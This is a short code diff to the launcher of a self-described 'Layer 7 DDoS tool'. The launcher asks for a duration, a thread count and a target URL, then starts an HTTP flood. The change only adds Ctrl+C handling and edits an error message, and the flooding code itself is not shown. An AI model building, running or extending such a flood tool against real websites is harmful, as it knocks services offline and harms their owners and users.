@@ -20,7 +20,7 @@ try:
 except ImportError as err:
     from tools.crash import CriticalError
 
-    CriticalError("Failed to import some packages!", err)
+    CriticalError("Failed to import some packages", err)
 
 
 if __name__ == "__main__":
@@ -42,13 +42,19 @@ if __name__ == "__main__":
     print(CRED2 + logo + CRED2)
     print("├───DDOS TOOL LAYER 7")
 
-    time = int(input(f"{Fore.RED}│   ├───TIME: {Fore.RESET}"))
-    threads = int(input(f"{Fore.RED}│   └───THREADS: {Fore.RESET}"))
-    target = str(input(f"{Fore.RED}│   └───URL: {Fore.RESET}"))
+    try:
+        time = int(input(f"{Fore.RED}│   ├───TIME: {Fore.RESET}"))
+        threads = int(input(f"{Fore.RED}│   └───THREADS: {Fore.RESET}"))
+        target = str(input(f"{Fore.RED}│   └───URL: {Fore.RESET}"))
 
-    with AttackMethod(
-        duration=time, method_name="HTTP", threads=threads, target=target
-    ) as Flood:
-        Flood.Start()
+        with AttackMethod(
+            duration=time, method_name="HTTP", threads=threads, target=target
+        ) as Flood:
+            Flood.Start()
+    except KeyboardInterrupt:
+        print(
+            f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Program closed.{Fore.RESET}"
+        )
+        sys.exit(1)
 else:
     sys.exit(1)
